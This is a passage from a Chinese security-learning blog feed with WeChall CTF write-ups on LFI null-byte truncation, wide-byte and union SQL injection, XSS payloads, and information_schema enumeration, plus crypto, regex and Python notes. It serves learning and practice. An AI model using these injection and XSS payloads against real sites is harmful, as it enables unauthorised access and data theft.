&apos;O:4:&quot;test&quot;:2:{s:3:&quot;aaa&quot;;s:3:&quot;111&quot;;}&apos;;</code></pre><p><img src="/pic/PHP（parse_url和反序列化）/6.png" alt="image"></p><p>这个漏洞存在PHP5.6.25之前版本和7.0.10之前的7.x版本中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1、parse-url&quot;&gt;&lt;a href=&quot;#1、parse-url&quot; class=&quot;headerlink&quot; title=&quot;1、parse_url()&quot;&gt;&lt;/a&gt;1、parse_url()&lt;/h2&gt;&lt;p&gt;parse_url — 解析 URL，返回其组成部分&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="php" scheme="http://Yuririns.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Wechall</title>
    <link href="http://Yuririns.github.io/2019/04/09/wechall/"/>
    <id>http://Yuririns.github.io/2019/04/09/wechall/</id>
    <published>2019-04-09T01:34:24.000Z</published>
    <updated>2019-05-06T02:21:20.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Training-Get-Sourced"><a href="#Training-Get-Sourced" class="headerlink" title="Training:Get Sourced"></a>Training:Get Sourced</h3><p>直接F12查看源码：<br><img src="/pic/wechall/1.png" alt="image"></p><h3 id="Training-Stegano-I"><a href="#Training-Stegano-I" class="headerlink" title="Training:Stegano I"></a>Training:Stegano I</h3><p>用十六进制编辑器打开图片：</p><h3 id="Training-ASCII"><a href="#Training-ASCII" class="headerlink" title="Training:ASCII"></a>Training:ASCII</h3><p>直接将ascii码转为字符：<br><img src="/pic/wechall/3.png" alt="image"></p><h3 id="Training-Encodings-URL"><a href="#Training-Encodings-URL" class="headerlink" title="Training:Encodings: URL"></a>Training:Encodings: URL</h3><p>url编码解码后得到：</p><blockquote><p>Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=aiiiagorpbcc&amp;cid=52#password=fibre_optics Very well done!</p></blockquote><h3 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h3><p>找到大于1000000，并和1000000最接近的两个质数，并满足这两个质数的各个位数字的和也是一个质数，python代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> math</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prim</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,int(math.sqrt(n)+<span class="number">1</span>)):</div><div class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line">num = <span class="number">1000000</span></div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    <span class="keyword">if</span> is_prim(sum(list(map(int,str(num))))) == <span class="keyword">True</span> <span class="keyword">and</span> is_prim(num) == <span class="keyword">True</span>:</div><div class="line">        print(num)</div><div class="line">        i += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:<span class="keyword">break</span></div><div class="line">    num += <span class="number">1</span></div></pre></td></tr></table></figure></p><p>运行结果：<br><img src="/pic/wechall/4.png" alt="image"><br>答案为10000331000037</p><h3 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h3><p>给出来的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$filename = <span class="string">'pages/'</span>.(<span class="keyword">isset</span>($_GET[<span class="string">"file"</span>])?$_GET[<span class="string">"file"</span>]:<span class="string">"welcome"</span>).<span class="string">'.html'</span>;</div><div class="line"><span class="keyword">include</span> $filename;</div></pre></td></tr></table></figure></p><p>包含在pages目录下的名为“file.html”的文件<br>输入?file=../solution.php%00，用%00截断后面的.html<br>但是发现显示No such file or directory<br>尝试再上一级目录：?file=../../solution.php%00 成功</p><h3 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP 0817"></a>PHP 0817</h3><p>看了下给出的代码，没有过滤，直接?which=solution</p><h3 id="PHP-0815"><a href="#PHP-0815" class="headerlink" title="PHP 0815"></a>PHP 0815</h3><p>查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">elseif (in_array($show, $whitelist))</div></pre></td></tr></table></figure></p><p>这一行进行了限制，核对了输入是否在白名单中<br>强制类型转换：<br>intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var_dump(intval(&apos;2&apos;)) //2</div><div class="line">var_dump(intval(&apos;3abcd&apos;)) //3</div><div class="line">var_dump(intval(&apos;abcd&apos;)) //0</div></pre></td></tr></table></figure></p><p>试了下intval()显示<br><img src="/pic/wechall/5.png" alt="image"><br>又试了下(int)显示<br><img src="/pic/wechall/6.png" alt="image"><br>去搜了下资料发现还可以用隐式转换：+0/-0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$a = true; // 1</div><div class="line">$aa = false; // 0</div><div class="line">$b = null; // 0</div><div class="line">echo $a + 1, &apos;&lt;br/&gt;&apos;; // 输出2</div><div class="line">echo $b + 1, &apos;&lt;br/&gt;&apos;; // 输出1</div><div class="line">echo 1 + &apos;ads234w&apos;, &apos;&lt;br/&gt;&apos;; // 输出1</div><div class="line">echo 1 + &apos;99a3ds234&apos;, &apos;&lt;br/&gt;&apos;; // 输出100</div><div class="line">echo true + &apos;99a3ds234&apos;, &apos;&lt;br/&gt;&apos;; // 输出100</div><div class="line">echo false + &apos;99a3ds234&apos;, &apos;&lt;br/&gt;&apos;; // 输出99</div></pre></td></tr></table></figure></p><h3 id="Addslashes"><a href="#Addslashes" class="headerlink" title="Addslashes"></a>Addslashes</h3><p>查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$username = addslashes($username);</div><div class="line">$password = md5($password);</div></pre></td></tr></table></figure></p><p>宽字节注入：<br>这是宽字节问题，因为 %df和(%5c)合成了一个運 导致后面’没有被转义，闭合成功，逃出引号，成功注入</p><pre><code>username=Admin%df&apos; or 1=1 %23</code></pre><p>显示：<br><img src="/pic/wechall/7.png" alt="image"><br>用limit试：</p><pre><code>?username=Admin%df&apos; or 1=1 limit 1,1 %23&amp;password=123456&amp;login=%E6%B3%A8%E5%86%8C</code></pre><h3 id="Crappyshare"><a href="#Crappyshare" class="headerlink" title="Crappyshare"></a>Crappyshare</h3><p>file://solution.php<br><img src="/pic/wechall/8.png" alt="image"></p><h3 id="Training-MySQL-I"><a href="#Training-MySQL-I" class="headerlink" title="Training: MySQL I"></a>Training: MySQL I</h3><pre><code>Username = 1&apos; or &apos;1&apos; = &apos;1&apos; or &apos;1&apos; =&apos;1Password = ***（任意数）</code></pre><p>源码中password用了md5加密，所以从username进行SQL注入<br>SQL语句中执行优先顺序not&gt;and&gt;or<br>然后注意到题目要求用admin登录：username = admin’ or ‘1’ = ‘1或者username = admin’ #</p><h3 id="Training-MySQL-II"><a href="#Training-MySQL-II" class="headerlink" title="Training: MySQL II"></a>Training: MySQL II</h3><p>密码和用户名分开验证，先验证单独用户名，再用查询用户名得到的密码与输入的密码进行验证<br>这里查了下资料，可以用union联合查询绕过验证</p><pre><code>Username = 1&apos; union select 1,&apos;admin&apos;,md5(&apos;111&apos;) #Password = 111</code></pre><p>查询测试：</p><pre><code>SELECT * FROM `user` WHERE 1</code></pre><p><img src="/pic/wechall/9.png" alt="image"></p><pre><code>SELECT * FROM `user` WHERE 1 union select 1,2</code></pre><p><img src="/pic/wechall/10.png" alt="image"></p><pre><code>SELECT * FROM `user` WHERE username = &apos;1&apos; union select &apos;password&apos;,&apos;username&apos;</code></pre><p><img src="/pic/wechall/11.png" alt="image"></p><h3 id="No-Escape"><a href="#No-Escape" class="headerlink" title="No Escape"></a>No Escape</h3><pre><code>$query = &quot;UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1&quot;;</code></pre><p>看源码发现要用`闭合而不是单引号</p><pre><code>?vote_for=bill`=111--+</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Training-Get-Sourced&quot;&gt;&lt;a href=&quot;#Training-Get-Sourced&quot; class=&quot;headerlink&quot; title=&quot;Training:Get Sourced&quot;&gt;&lt;/a&gt;Training:Get Sourced&lt;/h3&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Wechall-XSS</title>
    <link href="http://Yuririns.github.io/2019/04/05/Wechall-XSS/"/>
    <id>http://Yuririns.github.io/2019/04/05/Wechall-XSS/</id>
    <published>2019-04-05T14:24:12.000Z</published>
    <updated>2019-04-25T13:56:37.515Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Htmlspecialchars"><a href="#Htmlspecialchars" class="headerlink" title="Htmlspecialchars"></a>Htmlspecialchars</h3><p>试了下发现转义了双引号但没有转义单引号<br>Input：<code>111&#39; onmouseover=&#39;alert(111)</code><br>弹框：<br><img src="/pic/Wechall-XSS/1.png" alt="image"><br>查了下htmlspecialchars()相关资料发现当flags参数为默认的ENT_COMPAT时，仅编码双引号而不编码单引号。<br><img src="/pic/Wechall-XSS/2.png" alt="image"><br>将flags参数ENT_QUOTES添上通过:</p><pre><code>echo &quot;&lt;a href=&apos;http://&quot;.htmlspecialchars(Common::getPost(&apos;input&apos;),ENT_QUOTES).&quot;&apos;&gt;Exploit Me&lt;/a&gt;&quot;;</code></pre><h3 id="Yourself-PHP"><a href="#Yourself-PHP" class="headerlink" title="Yourself PHP"></a>Yourself PHP</h3><p>username参数输入被过滤了,看了下源码<br><img src="/pic/Wechall-XSS/3.png" alt="image"></p><p>$_SERVER[‘PHP_SELF’]漏洞<br>$_SERVER[‘PHP_SELF’]是一个服务器端的系统变量，会返回当前PHP文件相对于网站根目录的位置地址<br>比如这道题的地址为：<a href="https://www.wechall.net/challenge/yourself_php/index.php" target="_blank" rel="external">https://www.wechall.net/challenge/yourself_php/index.php</a><br>那这道题的$_SERVER[‘PHP_SELF’]值就为/challenge/yourself_php/index.php<br>当访问<a href="https://www.wechall.net/challenge/yourself_php/index.php/111时，并不会报错，并且$_SERVER[&#39;PHP_SELF&#39;]的值为challenge/yourself_php/index.php/111" target="_blank" rel="external">https://www.wechall.net/challenge/yourself_php/index.php/111时，并不会报错，并且$_SERVER[&#39;PHP_SELF&#39;]的值为challenge/yourself_php/index.php/111</a><br><img src="/pic/Wechall-XSS/5.png" alt="image"></p><pre><code>Payload:https://www.wechall.net/challenge/yourself_php/index.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Htmlspecialchars&quot;&gt;&lt;a href=&quot;#Htmlspecialchars&quot; class=&quot;headerlink&quot; title=&quot;Htmlspecialchars&quot;&gt;&lt;/a&gt;Htmlspecialchars&lt;/h3&gt;&lt;p&gt;试了下发现转义了双引号但没有
      
    
    </summary>
    
    
      <category term="XSS" scheme="http://Yuririns.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Wechall-Crypto</title>
    <link href="http://Yuririns.github.io/2019/04/05/Wechall-Crypto/"/>
    <id>http://Yuririns.github.io/2019/04/05/Wechall-Crypto/</id>
    <published>2019-04-05T13:16:44.000Z</published>
    <updated>2019-04-25T12:21:53.728Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Training-Crypto-Caesar-I"><a href="#Training-Crypto-Caesar-I" class="headerlink" title="Training: Crypto - Caesar I"></a>Training: Crypto - Caesar I</h3><p>提示是凯撒密码，写了个凯撒密码加解密的Python程序，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></div><div class="line">    message = input(<span class="string">"输入明文："</span>)</div><div class="line">    n = int(input(<span class="string">"输入密钥数字："</span>))</div><div class="line">    translated = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</div><div class="line">        <span class="keyword">if</span> i == <span class="string">' '</span>:</div><div class="line">            translated += <span class="string">' '</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            translated += chr((ord(i)<span class="number">-65</span>+n)%<span class="number">26</span>+<span class="number">65</span>)</div><div class="line">    print(translated)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></div><div class="line">    message = input(<span class="string">"输入密文："</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">        translated = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> message:</div><div class="line">            <span class="keyword">if</span> i == <span class="string">" "</span>:</div><div class="line">                translated += <span class="string">" "</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                translated += chr((ord(i)<span class="number">-65</span>-key)%<span class="number">26</span>+<span class="number">65</span>)</div><div class="line">        print(<span class="string">"密钥为%s，明文为：%s"</span> % (key,translated))</div><div class="line"></div><div class="line">mode = input(<span class="string">"需要加密输入1，需要解密输入2："</span>)</div><div class="line"><span class="keyword">if</span> mode == <span class="string">"1"</span>:</div><div class="line">    encode()</div><div class="line"><span class="keyword">elif</span> mode == <span class="string">"2"</span>:</div><div class="line">    decode()</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="string">"错误！"</span>)</div></pre></td></tr></table></figure></p><p>输入CQN ZDRLT KAXFW OXG SDVYB XENA CQN UJIH MXP XO LJNBJA JWM HXDA DWRZDN BXUDCRXW RB LXMXXQRPRJUX后运行结果：<br><img src="/pic/Wechall-Crypto/1.png" alt="image"></p><h3 id="Training-Crypto-Transposition-I"><a href="#Training-Crypto-Transposition-I" class="headerlink" title="Training: Crypto - Transposition I"></a>Training: Crypto - Transposition I</h3><p>置换加密，根据前面的oWdnreuf.l推测这个单词为Wonderful.，由此推测出密钥为1032547698（解密）<br>写了一个简单的小程序进行解密：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">a = <span class="string">"oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wd rodeapmomb.l"</span></div><div class="line">key = <span class="string">"1032547698"</span></div><div class="line">b = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</div><div class="line">    b.append(int(key[i%len(key)])+len(key)*(int(i/len(key))))</div><div class="line">c = list(map(<span class="keyword">lambda</span> x:a[x],b))</div><div class="line">print(<span class="string">''</span>.join(c))</div></pre></td></tr></table></figure></p><p>运行结果为：<br><img src="/pic/Wechall-Crypto/2.png" alt="image"></p><h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>凯撒密码，密钥数量从26扩大到128<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(message)</span>:</span></div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">128</span>):</div><div class="line">        isRight = <span class="keyword">True</span></div><div class="line">        translated = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> message:</div><div class="line">            translated += chr((key+i)%<span class="number">128</span>)</div><div class="line">        print(<span class="string">"密钥为%s，明文为：%s"</span> % (key,repr(translated)))</div><div class="line"></div><div class="line">message = <span class="string">"5A 02 02 77 20 7D 02 75 3F 20 0C 02 08 20 06 02 7F 09 78 77 20 02 01 78 20 00 02 05 78 20 76 7B 74 7F 7F 78 01 7A 78 20 7C 01 20 0C 02 08 05 20 7D 02 08 05 01 78 0C 41 20 67 7B 7C 06 20 02 01 78 20 0A 74 06 20 79 74 7C 05 7F 0C 20 78 74 06 0C 20 07 02 20 76 05 74 76 7E 41 20 6A 74 06 01 3A 07 20 7C 07 52 20 44 45 4B 20 7E 78 0C 06 20 7C 06 20 74 20 04 08 7C 07 78 20 06 00 74 7F 7F 20 7E 78 0C 06 03 74 76 78 3F 20 06 02 20 7C 07 20 06 7B 02 08 7F 77 01 3A 07 20 7B 74 09 78 20 07 74 7E 78 01 20 0C 02 08 20 07 02 02 20 7F 02 01 7A 20 07 02 20 77 78 76 05 0C 03 07 20 07 7B 7C 06 20 00 78 06 06 74 7A 78 41 20 6A 78 7F 7F 20 77 02 01 78 3F 20 0C 02 08 05 20 06 02 7F 08 07 7C 02 01 20 7C 06 20 78 7F 05 77 03 7C 7B 7B 74 01 74 7A 41"</span></div><div class="line">message = message.split(<span class="string">" "</span>)</div><div class="line">a = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> message]</div><div class="line">decode(a)</div></pre></td></tr></table></figure></p><p>为了在结果中直接输出\r而不转义，print时用了repr( )</p><blockquote><p>repr()： 产生一个解释器易读的表达形式。<br><img src="/pic/Wechall-Crypto/3.png" alt="image"></p></blockquote><h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p>用<a href="https://quipqiup.com/" target="_blank" rel="external">https://quipqiup.com/</a><br><img src="/pic/Wechall-Crypto/4.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Training-Crypto-Caesar-I&quot;&gt;&lt;a href=&quot;#Training-Crypto-Caesar-I&quot; class=&quot;headerlink&quot; title=&quot;Training: Crypto - Caesar I&quot;&gt;&lt;/a&gt;Training: C
      
    
    </summary>
    
    
      <category term="Crypto" scheme="http://Yuririns.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>wechall Regex正则</title>
    <link href="http://Yuririns.github.io/2019/04/02/wechall%20Regex%E6%AD%A3%E5%88%99/"/>
    <id>http://Yuririns.github.io/2019/04/02/wechall Regex正则/</id>
    <published>2019-04-02T12:13:53.000Z</published>
    <updated>2019-04-25T02:02:20.450Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>匹配空字</p><pre><code>/^$/</code></pre><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>匹配wechall</p><pre><code>/^wechall$/</code></pre><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>从这道题开始被自己蠢哭！！！！<br>一开始最后面没有加$，然后出现提示：</p><blockquote><p>Your pattern would match “wechall.jpg “, but it should not match it.</p></blockquote><p>意思是不能匹配“wechal.jpn （后面有个空格）”，但是我现在的答案是能匹配的，所以现在的答案是错误的<br>然而我当时一晃神看成了我需要匹配“wechal.jpn （后面有个空格）”，然后在这个空格上面死磕了好久，被自己蠢哭</p><p>匹配文件名为wechall或者wechall4，后缀为图片格式的后缀</p><pre><code>/^wechall4?\.(?:jpg|gif|tiff|bmp|png)$/</code></pre><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>匹配和level 3的要求一样，但是还要求捕获文件名（wehall/wechall4）但不捕获文件后缀名</p><pre><code>/^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$/</code></pre><p>这里后面的后缀名的非捕获组要使用“?:”而不是“?=”，是因为“?=”（正向肯定预查）不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</p><table><thead><tr><th style="text-align:center">表达式</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">(exp)</td><td style="text-align:center">匹配并捕获（捕获组）</td></tr><tr><td style="text-align:center">(?:exp)</td><td style="text-align:center">匹配但不捕获（非捕获组，只分组而不捕获）</td></tr><tr><td style="text-align:center">(?=exp)</td><td style="text-align:center">正向肯定预查，匹配查找但不捕获（非捕获组，只分组而不捕获）</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Level-1&quot;&gt;&lt;a href=&quot;#Level-1&quot; class=&quot;headerlink&quot; title=&quot;Level 1&quot;&gt;&lt;/a&gt;Level 1&lt;/h3&gt;&lt;p&gt;匹配空字&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/^$/
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;Leve
      
    
    </summary>
    
    
      <category term="正则" scheme="http://Yuririns.github.io/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入学习-information_schema库</title>
    <link href="http://Yuririns.github.io/2019/03/30/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0-information_schema%E5%BA%93/"/>
    <id>http://Yuririns.github.io/2019/03/30/SQL注入学习-information_schema库/</id>
    <published>2019-03-30T02:20:01.000Z</published>
    <updated>2019-04-24T01:33:26.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入学习-information-schema库"><a href="#SQL注入学习-information-schema库" class="headerlink" title="SQL注入学习-information_schema库"></a><strong>SQL注入学习-information_schema库</strong></h1><h3 id="查看information-schema库"><a href="#查看information-schema库" class="headerlink" title="查看information_schema库"></a>查看information_schema库</h3><p>1、schemata表<br>打开名叫schemata（这个单词是schem-图表的复数形式）的表，可以看到表中的内容，其中有一列的列名为schema_name，此列的数据为所有的数据库的名称<br><img src="/pic/sql学习1/1.png" alt="image"></p><p>2、tables表<br>打开名叫tables的表，可以看到表中的其中两列：table_schema和table_name，table_name的数据为数据库中的表名，而table_schema的数据为table_name中的表所对应的数据库名<br><img src="/pic/sql学习1/2.png" alt="image"></p><p>3、columns表<br>打开名叫columns的表，可以看到表中的其中三列：table_schema，table_name，column_name，其中的table_schema，table_name和在tables的表中的作用是相同的，而column_name这一列中的数据存放的是各个表里的列名<br><img src="/pic/sql学习1/3.png" alt="image"></p><h3 id="利用information-schema进行注入"><a href="#利用information-schema进行注入" class="headerlink" title="利用information_schema进行注入"></a>利用information_schema进行注入</h3><p>1、猜库<br>select schema_name from information_schema.schema</p><p>2、猜库中的表<br>select table_name from information_schema.tables where table_shcema=”xxx”</p><p>3、猜表中列<br>select column_name from information_schema.columns where table_name=”xxx”</p><p>4、猜段<br>select *** from ***</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入学习-information-schema库&quot;&gt;&lt;a href=&quot;#SQL注入学习-information-schema库&quot; class=&quot;headerlink&quot; title=&quot;SQL注入学习-information_schema库&quot;&gt;&lt;/a&gt;&lt;stro
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python 输出</title>
    <link href="http://Yuririns.github.io/2019/03/30/Python%E8%BE%93%E5%87%BA/"/>
    <id>http://Yuririns.github.io/2019/03/30/Python输出/</id>
    <published>2019-03-30T02:00:35.000Z</published>
    <updated>2020-02-11T09:21:52.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-输出"><a href="#python-输出" class="headerlink" title="python 输出"></a><strong>python 输出</strong></h1><p>##1、用“+”输出：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = <span class="string">'hello'</span></div><div class="line">b = <span class="string">'word'</span></div><div class="line">print(a+<span class="string">' '</span>+b+<span class="string">'!'</span>)</div><div class="line"><span class="comment">#输出：hello word!</span></div></pre></td></tr></table></figure></p><p> 输出中使用“*”：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print((a+<span class="string">' '</span>*<span class="number">10</span>))</div></pre></td></tr></table></figure></p><p>输出结果为：<br><img src="/pic/python输出/3.png" alt="image"></p><p>##2、标准化输出：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">i = <span class="number">0.999</span></div><div class="line"><span class="comment">#输出百分号需要用%%</span></div><div class="line">print(<span class="string">"一定要看%.1f%%这部剧！"</span> % (i*<span class="number">100</span>))</div></pre></td></tr></table></figure></p><p>结果为：<br><img src="/pic/python输出/4.png" alt="image"></p><p>常用输出：</p><table><thead><tr><th style="text-align:center">格式化符号</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">%o</td><td style="text-align:center">oct 八进制</td></tr><tr><td style="text-align:center">%d</td><td style="text-align:center">dec 十进制</td></tr><tr><td style="text-align:center">%x</td><td style="text-align:center">hex 十六进制</td></tr><tr><td style="text-align:center">%f</td><td style="text-align:center">转成浮点数</td></tr><tr><td style="text-align:center">%e</td><td style="text-align:center">转成科学计数法</td></tr><tr><td style="text-align:center">%g</td><td style="text-align:center">指数e+或浮点数 (根据显示长度)</td></tr><tr><td style="text-align:center">%%</td><td style="text-align:center">输出字符%</td></tr></tbody></table><p>##2、format格式化函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">a = <span class="string">"hello"</span></div><div class="line">b = <span class="string">"world"</span></div><div class="line">print(<span class="string">"&#123;1&#125; &#123;0&#125; &#123;1&#125;"</span>.format(a,b))</div><div class="line"><span class="comment">#输出：word hello word</span></div><div class="line">listA = [<span class="string">"hello"</span>,<span class="string">"hi"</span>,<span class="string">"!"</span>]</div><div class="line">print(<span class="string">"&#123;0[0]&#125;&#123;0[2]&#125; &#123;0[1]&#125;&#123;0[2]&#125;"</span>.format(listA)) <span class="comment">#&#123;0[1]&#125;前面那个0是必须的！</span></div><div class="line"><span class="comment">#输出：hello! hi!</span></div></pre></td></tr></table></figure></p><p>格式转化：<br><img src="/pic/python输出/5.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-输出&quot;&gt;&lt;a href=&quot;#python-输出&quot; class=&quot;headerlink&quot; title=&quot;python 输出&quot;&gt;&lt;/a&gt;&lt;strong&gt;python 输出&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;##1、用“+”输出：&lt;br&gt;&lt;figure cl
      
    
    </summary>
    
    
      <category term="python" scheme="http://Yuririns.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>XSS Challenges2</title>
    <link href="http://Yuririns.github.io/2019/03/19/XSS-Challenges2/"/>
    <id>http://Yuririns.github.io/2019/03/19/XSS-Challenges2/</id>
    <published>2019-03-19T03:06:15.000Z</published>
    <updated>2019-04-25T01:44:28.558Z</updated>
    
